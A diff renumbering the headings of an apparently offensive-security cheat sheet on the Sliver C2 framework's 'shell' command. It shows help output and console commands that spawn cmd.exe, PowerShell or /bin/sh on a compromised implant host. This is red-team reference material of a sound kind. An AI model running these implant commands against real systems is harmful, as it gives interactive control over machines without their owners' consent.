@@ -1,6 +1,6 @@
-# 00 - Spawn Shell
+# 14 - Spawn Shell
 
-### 00 - Help Menu
+### 14.1 - Help Menu
 
 ```
 sliver (IMPLANT_NAME) > shell -h
@@ -19,9 +19,9 @@ Flags:
   -t, --timeout    int       command timeout in seconds (default: 60)
 ```
 
-### - Usage
+### 14.2 - Usage
 
-#### 1 - Windows
+#### 14.2.1 - Windows
 
 ```
 sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\system32\\cmd.exe"
@@ -31,7 +31,7 @@ sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\system32\\WindowsPowershell\\v1.0
 sliver (IMPLANT_NAME) > shell -s "C:\\Windows\\SysWOW64\\WindowsPowershell\\v1.0\\powershell.exe"
 ```
 
-#### 2 - Linux
+#### 14.2.2 - Linux
 
 ```
 sliver (IMPLANT_NAME) > shell -y -s /bin/sh
